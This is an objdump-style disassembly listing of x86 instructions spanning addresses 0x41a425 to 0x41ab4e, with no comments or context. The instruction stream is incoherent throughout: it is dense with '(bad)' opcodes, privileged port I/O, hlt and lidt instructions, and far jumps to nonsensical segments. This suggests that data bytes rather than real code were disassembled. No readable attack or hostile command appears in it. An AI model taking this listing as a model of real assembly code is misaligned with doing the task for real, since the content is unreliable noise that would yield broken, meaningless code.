  41a425:	sub    cl,bh
  41a427:	pop    edx
  41a428:	call   0x93c9:0x8ceb7f85
  41a42f:	int    0xb1
  41a431:	dec    esi
  41a432:	sub    ebp,DWORD PTR [eax]
  41a434:	lods   eax,DWORD PTR ds:[esi]
  41a435:	mov    ecx,esp
  41a437:	pop    ebx
  41a438:	and    cl,BYTE PTR [edx]
  41a43a:	jae    0x41a4b2
  41a43c:	mov    bh,bl
  41a43e:	js     0x41a47c
  41a440:	sar    DWORD PTR [eax-0x58],cl
  41a443:	out    0xaf,al
  41a445:	ret    
  41a446:	adc    al,0xb1
  41a448:	cmp    BYTE PTR [esi+0x27],bh
  41a44b:	add    esp,esp
  41a44d:	pop    edx
  41a44e:	pop    ebx
  41a44f:	jne    0x41a3df
  41a451:	ja     0x41a448
  41a453:	dec    ebp
  41a454:	cmp    al,0xc
  41a456:	push   edi
  41a457:	xor    DWORD PTR [eax],esi
  41a459:	adc    bl,BYTE PTR [edi]
  41a45b:	test   eax,0xecbb6596
  41a460:	pop    edi
  41a461:	push   cs
  41a462:	sub    bl,BYTE PTR [ebx]
  41a464:	inc    esi
  41a465:	gs or  dl,cl
  41a468:	int    0x66
  41a46a:	in     al,0x1e
  41a46c:	add    eax,0xe9e9b04c
  41a471:	(bad)  
  41a472:	ret    0x1f79
  41a475:	int    0x5
  41a477:	je     0x41a4ae
  41a479:	jo     0x41a45a
  41a47b:	shr    BYTE PTR [ebx+0x2a],cl
  41a47e:	out    dx,al
  41a47f:	popa   
  41a480:	add    bh,0xe8
  41a483:	push   cs
  41a484:	inc    edi
  41a485:	mov    bl,0x90
  41a487:	jg     0x41a481
  41a489:	pop    ecx
  41a48a:	add    eax,DWORD PTR [edx]
  41a48c:	rcr    BYTE PTR [edi],1
  41a48e:	lods   al,BYTE PTR ds:[esi]
  41a48f:	push   es
  41a490:	test   DWORD PTR [edi-0x76],esi
  41a493:	addr16 aad 0xfb
  41a496:	sub    ah,BYTE PTR [ebp-0x73508523]
  41a49c:	hlt    
  41a49d:	cmp    BYTE PTR [edi+esi*4+0x73],dh
  41a4a1:	ins    BYTE PTR es:[edi],dx
  41a4a2:	or     BYTE PTR [ecx-0x282aa43a],ah
  41a4a8:	cmp    ecx,edx
  41a4aa:	outs   dx,DWORD PTR ds:[esi]
  41a4ab:	popf   
  41a4ac:	mov    eax,ds:0x3633a62a
  41a4b1:	aaa    
  41a4b2:	cdq    
  41a4b3:	rcr    DWORD PTR [ebx+eiz*8-0x1],cl
  41a4b7:	mov    al,0x9f
  41a4b9:	aaa    
  41a4ba:	or     esp,DWORD PTR [esi-0x26353ea]
  41a4c0:	jle    0x41a4e1
  41a4c2:	inc    edi
  41a4c3:	in     eax,dx
  41a4c4:	dec    eax
  41a4c5:	sub    DWORD PTR [eax],edi
  41a4c7:	arpl   WORD PTR [ecx],bp
  41a4c9:	mov    ebx,0xccdcdbaa
  41a4ce:	ja     0x41a525
  41a4d0:	ret    0x9fd0
  41a4d3:	gs aad 0x61
  41a4d6:	dec    eax
  41a4d7:	cld    
  41a4d8:	fcmovne st,st(3)
  41a4da:	(bad)  
  41a4db:	scas   eax,DWORD PTR es:[edi]
  41a4dc:	in     al,dx
  41a4dd:	push   ecx
  41a4de:	and    eax,0xc5370331
  41a4e3:	push   edi
  41a4e4:	jmp    0x183e:0x9cb4dfa3
  41a4eb:	(bad)  
  41a4ec:	pop    eax
  41a4ed:	retf   0xf498
  41a4f0:	outs   dx,BYTE PTR ds:[esi]
  41a4f1:	mov    bl,0xe6
  41a4f3:	int    0x12
  41a4f5:	(bad)  
  41a4f6:	mov    ah,0x3e
  41a4f8:	add    bh,BYTE PTR [esi+0x77b9891b]
  41a4fe:	pop    ecx
  41a4ff:	inc    edi
  41a500:	std    
  41a501:	adc    BYTE PTR [edx],al
  41a503:	mov    WORD PTR [edi+0x71],ss
  41a506:	and    al,BYTE PTR [ebp+ecx*8+0x7fd7cd45]
  41a50d:	bnd ret 0xb85c
  41a511:	fild   DWORD PTR [ebx-0x46]
  41a514:	dec    ebp
  41a515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a516:	mov    eax,ds:0xe175ec95
  41a51b:	mov    ah,BYTE PTR [ebp+ecx*2-0x185a0cad]
  41a522:	mov    ecx,0xcc6f4b3e
  41a527:	push   edi
  41a528:	(bad)  
  41a529:	jae    0x41a589
  41a52b:	into   
  41a52c:	mov    dl,BYTE PTR [ecx]
  41a52e:	jmp    DWORD PTR ds:0xe9760420
  41a534:	mov    dl,0xfe
  41a536:	int    0x8e
  41a538:	xchg   edi,eax
  41a539:	in     al,dx
  41a53a:	dec    BYTE PTR [esi+0x60]
  41a53d:	retf   0xde0c
  41a540:	stc    
  41a541:	test   eax,0xd07cb7c5
  41a546:	je     0x41a4f5
  41a548:	cmc    
  41a549:	sbb    DWORD PTR [edx-0x6364a05e],esi
  41a54f:	inc    ecx
  41a550:	cmp    al,0x81
  41a552:	xchg   ebx,eax
  41a553:	out    0x64,al
  41a555:	mov    DWORD PTR [ebp+esi*8+0x24bcf8a6],ecx
  41a55c:	mov    bl,0x32
  41a55e:	inc    ecx
  41a55f:	fbstp  TBYTE PTR [edx]
  41a561:	mov    ds:0x15c4f369,al
  41a566:	loop   0x41a4f3
  41a568:	jbe    0x41a4fb
  41a56a:	mov    edx,0x11239b3c
  41a56f:	mov    ebp,0x51968ff4
  41a574:	jbe    0x41a5ce
  41a576:	sbb    BYTE PTR [ebp+0x75],ah
  41a579:	mov    dl,0x27
  41a57b:	scas   al,BYTE PTR es:[edi]
  41a57c:	adc    al,0xff
  41a57e:	pusha  
  41a57f:	fist   DWORD PTR [eax-0x4b]
  41a582:	mov    ds:0xd22d6973,eax
  41a587:	int3   
  41a588:	sbb    cl,BYTE PTR gs:[eax-0x48]
  41a58c:	inc    eax
  41a58d:	adc    al,0x7e
  41a58f:	inc    edx
  41a590:	sar    DWORD PTR [edx],1
  41a592:	neg    BYTE PTR [ecx+0x21b1c07f]
  41a598:	clc    
  41a599:	cmp    al,0x99
  41a59b:	test   esp,edx
  41a59d:	mov    edx,0x71b697f
  41a5a2:	or     BYTE PTR [edi-0x7c91086],dh
  41a5a8:	int    0x4a
  41a5aa:	lahf   
  41a5ab:	push   ds
  41a5ac:	jmp    0x9c34:0x9a3d45a4
  41a5b3:	adc    cl,BYTE PTR [ecx]
  41a5b5:	xor    al,0xa3
  41a5b7:	jnp    0x41a60b
  41a5b9:	dec    eax
  41a5ba:	add    DWORD PTR ds:0x50bfbb7c,ebx
  41a5c0:	inc    eax
  41a5c1:	jle    0x41a5ff
  41a5c3:	mov    bl,dl
  41a5c5:	cmp    eax,DWORD PTR [edx+0x26cd7272]
  41a5cb:	aam    0x77
  41a5cd:	xor    edx,ecx
  41a5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5d0:	ja     0x41a616
  41a5d2:	inc    ebx
  41a5d3:	outs   dx,BYTE PTR ds:[esi]
  41a5d4:	cdq    
  41a5d5:	jmp    0x41a569
  41a5d7:	int    0x46
  41a5d9:	pusha  
  41a5da:	jle    0x41a58e
  41a5dc:	dec    esp
  41a5dd:	scas   eax,DWORD PTR es:[edi]
  41a5de:	clc    
  41a5df:	xor    bh,BYTE PTR [esi]
  41a5e1:	inc    edi
  41a5e2:	je     0x41a5f6
  41a5e4:	jp     0x41a5b2
  41a5e6:	lahf   
  41a5e7:	imul   esp,DWORD PTR [ecx-0x1e],0x446fc6e9
  41a5ee:	sbb    cl,0x18
  41a5f1:	xlat   BYTE PTR ds:[ebx]
  41a5f2:	adc    DWORD PTR [edx+eiz*8-0x3d9dd135],0x1f
  41a5fa:	seta   cl
  41a5fd:	jl     0x41a5f7
  41a5ff:	jno    0x41a671
  41a601:	aam    0x11
  41a603:	cs adc al,0xed
  41a606:	daa    
  41a607:	sub    BYTE PTR [esi-0x37c00578],dl
  41a60d:	clc    
  41a60e:	push   esi
  41a60f:	dec    cl
  41a611:	mov    al,0xc4
  41a613:	pop    edi
  41a614:	ss cdq 
  41a616:	sbb    DWORD PTR [edx],eax
  41a618:	icebp  
  41a619:	cmp    bl,BYTE PTR [eax-0x3ff8368e]
  41a61f:	sbb    bh,0x6a
  41a622:	mov    DWORD PTR [ebx+0x7cb6688c],ecx
  41a628:	daa    
  41a629:	add    al,0x6f
  41a62b:	fisubr DWORD PTR [ecx]
  41a62d:	lods   eax,DWORD PTR ds:[esi]
  41a62e:	jmp    0xff1fbce5
  41a633:	mov    edi,0xe5faed6
  41a638:	xor    al,0x7f
  41a63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63b:	add    al,0x32
  41a63d:	push   esi
  41a63e:	inc    edx
  41a63f:	out    0x4e,al
  41a641:	into   
  41a642:	cs ret 0x8513
  41a646:	mov    dl,0xa1
  41a648:	sar    edi,1
  41a64a:	das    
  41a64b:	mov    WORD PTR [ebx],fs
  41a64d:	iret   
  41a64e:	mov    ch,0x5f
  41a650:	std    
  41a651:	sub    edi,edi
  41a653:	out    dx,eax
  41a654:	mov    bl,0xb2
  41a656:	rol    esi,1
  41a658:	xchg   edi,eax
  41a659:	stos   DWORD PTR es:[edi],eax
  41a65a:	cmp    al,0x9d
  41a65c:	sbb    ecx,DWORD PTR [ebx-0x1f]
  41a65f:	retf   
  41a660:	inc    edi
  41a661:	mov    ebx,0x2ed2c788
  41a666:	pop    eax
  41a667:	jbe    0x41a695
  41a669:	ins    DWORD PTR es:[edi],dx
  41a66a:	sar    eax,cl
  41a66c:	mov    ch,0xe3
  41a66e:	cmp    BYTE PTR [edi+0x5804ebb4],ch
  41a674:	fwait
  41a675:	shl    DWORD PTR [ecx],1
  41a677:	idiv   DWORD PTR [edi-0x5c]
  41a67a:	jno    0x41a67a
  41a67c:	loopne 0x41a623
  41a67e:	ins    BYTE PTR es:[edi],dx
  41a67f:	clc    
  41a680:	(bad)  
  41a682:	xchg   esi,eax
  41a683:	popa   
  41a684:	mov    ah,0x4f
  41a686:	lods   eax,DWORD PTR ds:[esi]
  41a687:	mov    esp,0xcacaa7d8
  41a68c:	mov    ebp,0x721da644
  41a691:	mov    ds:0x2bcf3e74,eax
  41a696:	xchg   ecx,eax
  41a697:	xor    bh,BYTE PTR [ebx+0x21]
  41a69a:	rol    esp,cl
  41a69c:	push   0x2e7fa758
  41a6a1:	cmp    al,0x2d
  41a6a3:	adc    al,0x2d
  41a6a5:	sbb    DWORD PTR [edx+edx*8-0x3f513be2],edi
  41a6ac:	inc    ebx
  41a6ad:	adc    cl,ah
  41a6af:	sub    BYTE PTR [esi+edi*8+0x53],dl
  41a6b3:	or     BYTE PTR [edx+0xc1d5179],dl
  41a6b9:	in     eax,dx
  41a6ba:	push   es
  41a6bb:	(bad)  
  41a6bc:	loop   0x41a655
  41a6be:	jno    0x41a6cc
  41a6c0:	dec    esi
  41a6c1:	aad    0xf8
  41a6c3:	add    esp,DWORD PTR [ebx-0x7edeaee4]
  41a6c9:	ins    DWORD PTR es:[edi],dx
  41a6ca:	sub    edx,DWORD PTR [ecx]
  41a6cc:	ret    0x7fb8
  41a6cf:	push   ds
  41a6d0:	or     DWORD PTR [edi-0x21d8c6f3],edi
  41a6d6:	adc    eax,DWORD PTR [esi]
  41a6d8:	cmp    ch,ah
  41a6da:	jle    0x41a71d
  41a6dc:	into   
  41a6dd:	sbb    DWORD PTR [ecx-0x6858b948],0x5b
  41a6e4:	out    dx,eax
  41a6e5:	fwait
  41a6e6:	xor    edi,DWORD PTR [edx-0x5f]
  41a6e9:	dec    edi
  41a6ea:	mov    dh,0xd1
  41a6ec:	add    DWORD PTR [ecx-0x237f56ec],edx
  41a6f2:	xor    cl,BYTE PTR [ebp-0x66175932]
  41a6f8:	xor    al,0xfc
  41a6fa:	js     0x41a6d1
  41a6fc:	xor    eax,0x74a4b60c
  41a701:	nop
  41a702:	xchg   edi,eax
  41a703:	jp     0x41a6de
  41a705:	and    DWORD PTR [esi],ebp
  41a707:	mov    edx,0x447c839b
  41a70c:	in     eax,0x2c
  41a70e:	in     al,dx
  41a70f:	xlat   BYTE PTR ds:[ebx]
  41a710:	repnz (bad) 
  41a712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a713:	or     al,0xc
  41a715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a716:	mov    ds:0xf8290af3,al
  41a71b:	sti    
  41a71c:	xor    DWORD PTR ds:0x93ba145a,edi
  41a722:	loop   0x41a78e
  41a724:	jle    0x41a6b5
  41a726:	frstor [ebp-0x79a66aae]
  41a72c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a72e:	or     al,BYTE PTR [ebx]
  41a730:	add    BYTE PTR [edx],0xc
  41a733:	push   0xffffffe4
  41a735:	iret   
  41a736:	dec    esp
  41a737:	mov    BYTE PTR [ecx+0x1d0ae08e],0x45
  41a73e:	and    BYTE PTR [ebp+0x437dadbb],ch
  41a744:	dec    edx
  41a745:	fcom   QWORD PTR [edi-0x4bea5b44]
  41a74b:	dec    esp
  41a74c:	cmp    dl,dl
  41a74e:	mov    eax,DWORD PTR [edi+0x37]
  41a751:	sar    ebx,cl
  41a753:	sahf   
  41a754:	xor    dh,BYTE PTR [ebp-0x45]
  41a757:	es and dh,ch
  41a75a:	adc    eax,0x1e75c4f
  41a75f:	lea    eax,[esi]
  41a761:	mov    edx,ebx
  41a763:	sub    DWORD PTR [ebx],ebx
  41a765:	aas    
  41a766:	addr16 cmc 
  41a768:	stc    
  41a769:	fdiv   QWORD PTR [ecx-0x788e01ef]
  41a76f:	push   esp
  41a770:	lods   eax,DWORD PTR ds:[esi]
  41a771:	pop    edi
  41a772:	data16 rcl BYTE PTR ds:0x4b8d62ff,0x27
  41a77a:	fbld   TBYTE PTR [eax+ebx*8]
  41a77d:	xchg   ecx,eax
  41a77e:	add    al,0x52
  41a780:	loop   0x41a78d
  41a782:	imul   esi,DWORD PTR [esi-0x643dccf2],0xffffffdc
  41a789:	xor    al,0xd4
  41a78b:	loope  0x41a7fb
  41a78d:	sub    ecx,edx
  41a78f:	out    0x87,eax
  41a791:	inc    ebx
  41a792:	or     esp,esp
  41a794:	iret   
  41a795:	enter  0x93c8,0x33
  41a799:	lds    edi,FWORD PTR [edi-0x736c0b27]
  41a79f:	inc    ecx
  41a7a0:	mov    ss,WORD PTR [edi-0x74]
  41a7a3:	lidtd  [esi-0x14]
  41a7a7:	cmp    eax,0xe3e13bd3
  41a7ac:	je     0x41a7ac
  41a7ae:	xor    DWORD PTR [edx],0xffffff81
  41a7b1:	or     DWORD PTR [ebx-0x4d7f57d2],eax
  41a7b7:	and    DWORD PTR [ebx],edi
  41a7b9:	leave  
  41a7ba:	add    bh,BYTE PTR [edx]
  41a7bc:	push   esi
  41a7bd:	inc    esp
  41a7be:	lahf   
  41a7bf:	sar    DWORD PTR [esi+esi*8],1
  41a7c2:	lahf   
  41a7c3:	or     ah,BYTE PTR [esi+0x20]
  41a7c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c7:	test   al,0x60
  41a7c9:	retf   0x567a
  41a7cc:	fst    DWORD PTR [eax+eiz*8-0x12]
  41a7d0:	out    0x20,al
  41a7d2:	(bad)  
  41a7d3:	jb     0x41a844
  41a7d5:	push   ds
  41a7d6:	cmp    DWORD PTR [ecx],eax
  41a7d8:	xchg   ebx,eax
  41a7d9:	(bad)  
  41a7da:	mov    DWORD PTR [esi],ebx
  41a7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7dd:	mov    al,ds:0xdb34425c
  41a7e2:	in     al,0x6b
  41a7e4:	addr16 jl 0x41a78d
  41a7e7:	sbb    al,0xc9
  41a7e9:	ins    DWORD PTR es:[edi],dx
  41a7ea:	mov    BYTE PTR cs:[esp+esi*2],ch
  41a7ee:	(bad)  
  41a7ef:	rol    DWORD PTR ds:0xc0c77b12,cl
  41a7f5:	es sub ebp,eax
  41a7f8:	mov    dl,0x97
  41a7fa:	cld    
  41a7fb:	hlt    
  41a7fc:	mov    edx,?
  41a7fe:	inc    eax
  41a7ff:	xchg   BYTE PTR [edi-0x65ce237],al
  41a805:	xchg   esi,eax
  41a806:	adc    esp,0xffffff8a
  41a809:	sbb    edx,esp
  41a80b:	cmp    ebp,DWORD PTR [ebx-0x3]
  41a80e:	fnstenv [esp+ecx*2+0x8da00e9]
  41a815:	ficom  DWORD PTR [ecx+0x2ab65e0]
  41a81b:	sbb    dl,0xd4
  41a81e:	xchg   edi,eax
  41a81f:	test   al,0xa2
  41a822:	cmp    DWORD PTR [ebp-0x3909b572],0xffffffe1
  41a829:	jns    0x41a81f
  41a82b:	addr16 add al,0x12
  41a82e:	lods   eax,DWORD PTR cs:[esi]
  41a830:	dec    eax
  41a831:	aam    0xcd
  41a833:	adc    ecx,DWORD PTR [edx+0x5b]
  41a836:	hlt    
  41a837:	cmp    DWORD PTR [ebx+ecx*4],edi
  41a83a:	xor    al,0xd0
  41a83c:	pop    edx
  41a83d:	clc    
  41a83e:	cwde   
  41a83f:	push   ds
  41a840:	das    
  41a841:	mov    bh,0x84
  41a843:	xchg   esp,eax
  41a844:	or     eax,0xed1f4fe
  41a849:	or     ecx,esi
  41a84b:	inc    ebx
  41a84c:	sub    ch,dh
  41a84e:	or     esp,ebx
  41a850:	int    0x1f
  41a852:	sub    eax,0xf2101a7c
  41a857:	xor    DWORD PTR [edx*4-0x47cff3a9],edi
  41a85e:	gs pop ebx
  41a860:	pop    edi
  41a861:	pushaw 
  41a863:	std    
  41a864:	add    BYTE PTR [ecx-0x28],ch
  41a867:	mov    bl,0xa8
  41a869:	jle    0x41a83a
  41a86b:	push   ebx
  41a86c:	and    DWORD PTR [esi+ebx*2],0xffffff8f
  41a870:	cdq    
  41a871:	or     cl,BYTE PTR [edi+0xa]
  41a874:	sub    esi,0x7a0e0d5e
  41a87a:	pusha  
  41a87b:	and    eax,0x4899df8a
  41a880:	test   al,0xaf
  41a882:	jne    0x41a821
  41a884:	(bad)  [eax-0x71]
  41a887:	aad    0xba
  41a889:	inc    ebp
  41a88a:	push   0x23e7506
  41a88f:	pop    eax
  41a890:	xor    BYTE PTR [edx+0x58e4fb94],dl
  41a896:	inc    edi
  41a897:	ficomp DWORD PTR [edx-0x2f]
  41a89a:	sbb    al,0xb4
  41a89c:	push   0xfffffffd
  41a89e:	jno    0x41a914
  41a8a0:	dec    edx
  41a8a1:	in     eax,dx
  41a8a2:	shr    BYTE PTR [edi-0x13],1
  41a8a5:	fsub   QWORD PTR [ebp+edi*1-0x6318f939]
  41a8ac:	cld    
  41a8ad:	popa   
  41a8ae:	inc    eax
  41a8af:	mov    ebp,0x633a38a6
  41a8b4:	test   al,0x1f
  41a8b6:	xor    al,bh
  41a8b8:	mov    bh,0xfd
  41a8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8bb:	cmc    
  41a8bc:	xor    DWORD PTR [ebx-0x67de99bd],esi
  41a8c2:	cmp    al,0xd8
  41a8c4:	mov    dh,0x2c
  41a8c6:	add    dh,BYTE PTR [edx]
  41a8c8:	std    
  41a8c9:	in     eax,0xe8
  41a8cb:	mov    ebp,0xabd91f07
  41a8d0:	sub    eax,0x703e4768
  41a8d5:	or     BYTE PTR [esi-0x23],ah
  41a8d8:	mov    ds:0xe1c6baec,eax
  41a8dd:	jae    0x41a89d
  41a8df:	dec    edx
  41a8e0:	mov    edx,0x8ab1988e
  41a8e5:	ja     0x41a91f
  41a8e7:	shr    dl,cl
  41a8e9:	(bad)  
  41a8eb:	sub    esp,DWORD PTR [edi+0x3c]
  41a8ee:	pusha  
  41a8ef:	nop
  41a8f0:	mov    BYTE PTR [eax-0x50],ch
  41a8f3:	sbb    ch,BYTE PTR [ebx-0x22]
  41a8f6:	dec    edx
  41a8f7:	in     al,0x6
  41a8f9:	jb     0x41a8ed
  41a8fb:	in     eax,0xbd
  41a8fd:	adc    al,0xe5
  41a8ff:	mov    ebx,0xfe19eb72
  41a904:	jb     0x41a97f
  41a906:	pop    edx
  41a907:	xchg   edx,eax
  41a908:	and    cl,BYTE PTR [eax+0x193fb727]
  41a90e:	data16 ins BYTE PTR es:[edi],dx
  41a910:	sahf   
  41a911:	sbb    BYTE PTR [ecx],ch
  41a913:	and    eax,0x78663912
  41a918:	inc    DWORD PTR ds:0x3d0e020a
  41a91e:	xchg   dl,dl
  41a920:	dec    esp
  41a921:	dec    esp
  41a922:	push   ebp
  41a923:	stc    
  41a924:	mov    ds:0x2c9e317e,al
  41a929:	out    0xf0,al
  41a92b:	int3   
  41a92c:	jg     0x41a9a5
  41a92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a92f:	(bad)  
  41a930:	es ret 
  41a932:	fwait
  41a933:	(bad)  
  41a934:	leave  
  41a935:	das    
  41a936:	sub    eax,0xda435b52
  41a93b:	and    eax,0xdde9a8e8
  41a940:	cld    
  41a941:	bound  ebp,QWORD PTR [ecx]
  41a943:	dec    eax
  41a944:	mov    al,ds:0x37a8a720
  41a949:	or     ch,BYTE PTR [esi+0x14]
  41a94c:	add    bl,bh
  41a94e:	les    eax,FWORD PTR [edx]
  41a950:	jg     0x41a904
  41a952:	test   eax,0x1442d653
  41a957:	adc    eax,0x8673e600
  41a95c:	add    al,0x4b
  41a95e:	ds ret 0xb557
  41a962:	out    0x70,al
  41a964:	jg     0x41a98e
  41a966:	xchg   DWORD PTR [ebp+0x17],edx
  41a969:	xor    bh,dh
  41a96b:	pop    ecx
  41a96c:	ret    0x858d
  41a96f:	sub    eax,0xf78f69dc
  41a974:	mov    ds:0x4efb9d36,eax
  41a979:	(bad)  
  41a97a:	loop   0x41a981
  41a97c:	nop
  41a97d:	fsubr  QWORD PTR [edi-0x66d96225]
  41a983:	into   
  41a984:	jge    0x41a9b8
  41a986:	(bad)  
  41a988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a989:	cmp    bh,BYTE PTR [ecx]
  41a98b:	xor    dh,BYTE PTR [eax]
  41a98d:	and    bh,BYTE PTR [ecx+0x4b39e745]
  41a993:	popa   
  41a994:	mov    esp,0xb9915b88
  41a999:	lahf   
  41a99a:	mov    BYTE PTR [esi-0x7cf4da18],cl
  41a9a0:	mov    ecx,0x63c1ac5c
  41a9a5:	leave  
  41a9a6:	test   DWORD PTR [esi+0x6eab8c01],ecx
  41a9ac:	and    al,0xe7
  41a9ae:	jge    0x41a96b
  41a9b0:	scas   eax,DWORD PTR es:[edi]
  41a9b1:	sbb    bh,BYTE PTR [edx-0x5b]
  41a9b4:	cmp    eax,0x65ed65a4
  41a9b9:	sbb    al,0xf2
  41a9bb:	outs   dx,DWORD PTR ds:[esi]
  41a9bc:	rcl    cl,cl
  41a9be:	into   
  41a9bf:	pop    eax
  41a9c0:	inc    ebp
  41a9c1:	ret    0x518d
  41a9c4:	add    eax,0xbe3c1
  41a9c9:	mov    ecx,0xf7fd2dec
  41a9ce:	loop   0x41a9c2
  41a9d0:	cli    
  41a9d1:	leave  
  41a9d2:	(bad)  
  41a9d3:	js     0x41a9a2
  41a9d5:	cmp    eax,DWORD PTR [ebp+0x79]
  41a9d8:	cmp    DWORD PTR [ebx],esi
  41a9da:	outs   dx,DWORD PTR ds:[esi]
  41a9db:	cmp    eax,0x8410b202
  41a9e0:	adc    DWORD PTR [ebx-0x334f5ee],eax
  41a9e6:	lods   al,BYTE PTR ds:[esi]
  41a9e7:	fldenv [edx]
  41a9e9:	pop    ds
  41a9ea:	cmp    ebx,DWORD PTR [eax-0x7ce9e6d0]
  41a9f0:	stc    
  41a9f1:	jns    0x41a977
  41a9f3:	in     eax,dx
  41a9f4:	mov    eax,DWORD PTR [ecx]
  41a9f6:	fistp  WORD PTR [eax]
  41a9f8:	xlat   BYTE PTR ds:[ebx]
  41a9f9:	push   ss
  41a9fa:	jno    0x41a9c7
  41a9fc:	push   ds
  41a9fd:	out    dx,al
  41a9fe:	leave  
  41a9ff:	pushf  
  41aa00:	std    
  41aa01:	das    
  41aa02:	cmp    BYTE PTR [ebx-0x6b],ch
  41aa05:	mov    ds:0xe3fb31d,eax
  41aa0a:	adc    DWORD PTR [esi+edi*8],esi
  41aa0d:	stos   DWORD PTR es:[edi],eax
  41aa0e:	adc    eax,0x99f6425d
  41aa13:	bound  ebp,QWORD PTR cs:[ebp+ebx*8+0x3a]
  41aa18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa19:	pushf  
  41aa1a:	and    bh,BYTE PTR [esi]
  41aa1c:	cmp    ebp,esi
  41aa1e:	je     0x41aa7b
  41aa20:	ins    DWORD PTR es:[edi],dx
  41aa21:	cli    
  41aa22:	sub    esp,DWORD PTR [ebx]
  41aa24:	fisttp DWORD PTR [ebp-0x1df17a87]
  41aa2a:	pop    ss
  41aa2b:	sub    eax,esp
  41aa2d:	je     0x41aa34
  41aa2f:	sub    ebp,esi
  41aa31:	or     BYTE PTR [ebx+ebx*2],0xcb
  41aa35:	pushf  
  41aa36:	sbb    dl,al
  41aa38:	in     eax,0x3f
  41aa3a:	mov    cs,WORD PTR [edx+ebx*1-0x238a3bc5]
  41aa41:	pop    edx
  41aa42:	push   ds
  41aa43:	fwait
  41aa44:	xchg   DWORD PTR [esi+0x27],esp
  41aa47:	scas   eax,DWORD PTR es:[edi]
  41aa48:	pop    ebp
  41aa49:	cmp    bh,BYTE PTR [esi+eiz*1-0x6]
  41aa4d:	add    BYTE PTR [edi],bh
  41aa4f:	std    
  41aa50:	xchg   ebx,eax
  41aa51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa52:	push   es
  41aa53:	(bad)  
  41aa54:	pop    ebp
  41aa55:	push   cs
  41aa56:	data16 lahf 
  41aa58:	push   esi
  41aa59:	xor    DWORD PTR [ecx-0x15b8ec33],0x4
  41aa60:	rcr    DWORD PTR [ebp+edi*8+0x648e60c],1
  41aa67:	test   BYTE PTR [edx],al
  41aa69:	loope  0x41a9f0
  41aa6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6c:	add    DWORD PTR [ecx+0x3d734683],0xe684257c
  41aa76:	cmc    
  41aa77:	fbstp  TBYTE PTR [esi-0x5c]
  41aa7a:	lods   eax,DWORD PTR ds:[esi]
  41aa7b:	xor    ah,ch
  41aa7d:	dec    eax
  41aa7e:	xor    eax,0xa868ae6a
  41aa83:	int3   
  41aa84:	arpl   WORD PTR [esi+0x5e],ax
  41aa87:	adc    al,0x9e
  41aa89:	lahf   
  41aa8a:	shl    al,0x5
  41aa8d:	loopne 0x41aafc
  41aa8f:	outs   dx,BYTE PTR ds:[esi]
  41aa90:	jno    0x41aa1b
  41aa92:	in     eax,dx
  41aa93:	pop    esp
  41aa94:	inc    esp
  41aa95:	lea    edi,[ebx-0x4f]
  41aa98:	(bad)  
  41aa99:	add    ch,dh
  41aa9b:	(bad)
  41aa9e:	cmc    
  41aa9f:	xchg   edx,eax
  41aaa0:	mov    BYTE PTR [edi+esi*2+0x3],ah
  41aaa4:	sbb    BYTE PTR [eax],ah
  41aaa6:	aas    
  41aaa7:	dec    eax
  41aaa8:	mov    ds:0xb0544441,eax
  41aaad:	add    al,0x1
  41aaaf:	or     DWORD PTR [edx],edx
  41aab1:	xor    eax,0xef33b101
  41aab6:	jnp    0x41ab02
  41aab8:	xor    ch,cl
  41aaba:	in     eax,dx
  41aabb:	dec    edx
  41aabc:	sub    ebx,DWORD PTR cs:[edi+ebp*2-0x5f]
  41aac1:	addr16 cli 
  41aac3:	loopne 0x41aaf2
  41aac5:	add    bh,BYTE PTR [esi]
  41aac7:	fwait
  41aac8:	xor    dl,dh
  41aaca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aacb:	loop   0x41ab39
  41aacd:	call   0xed3f11e4
  41aad2:	xchg   BYTE PTR [edi-0xa],al
  41aad5:	push   ecx
  41aad6:	rcl    BYTE PTR [esi],cl
  41aad8:	xchg   BYTE PTR ds:0x182701ba,bl
  41aade:	clc    
  41aadf:	mov    ebp,0x80fddbcd
  41aae4:	jae    0x41aad9
  41aae6:	(bad)  
  41aae7:	jmp    0xd03a:0xf474ac89
  41aaee:	dec    ebx
  41aaef:	pop    ebx
  41aaf0:	stc    
  41aaf1:	loopne 0x41ab71
  41aaf3:	fidivr WORD PTR [edx+0x2e]
  41aaf6:	ret    
  41aaf7:	inc    edi
  41aaf8:	mov    ebx,0x217548fe
  41aafd:	fmulp  st(0),st
  41aaff:	adc    BYTE PTR [esi-0x27],ah
  41ab02:	je     0x41ab54
  41ab04:	xchg   edx,eax
  41ab05:	pop    esp
  41ab06:	pop    ebp
  41ab07:	loope  0x41ab83
  41ab09:	adc    DWORD PTR [ebp+0x53857990],eax
  41ab0f:	mov    ds:0x4f52f683,eax
  41ab14:	jecxz  0x41ab1b
  41ab16:	aas    
  41ab17:	add    esp,DWORD PTR [ebp+0x2f]
  41ab1a:	xchg   ebx,eax
  41ab1b:	cmp    bh,ch
  41ab1d:	mov    dl,0xab
  41ab1f:	call   0x7d07:0x6c30bcec
  41ab26:	pusha  
  41ab27:	in     al,dx
  41ab28:	and    DWORD PTR ds:0x17016cf1,esi
  41ab2e:	sbb    esp,DWORD PTR [esi+ebp*8-0x4a]
  41ab32:	or     BYTE PTR [edx],0x45
  41ab35:	sub    eax,0x65ad3cd6
  41ab3a:	sub    DWORD PTR [eax-0x2c18295d],ecx
  41ab40:	cmp    DWORD PTR [edx+0x6a],esi
  41ab43:	mov    es,WORD PTR [ebx]
  41ab45:	fisttp DWORD PTR [eax+edx*1+0x16]
  41ab49:	xor    cl,BYTE PTR [ebp-0x1d]
  41ab4c:	mov    dh,0x22
  41ab4e:	mov    al,0x8e
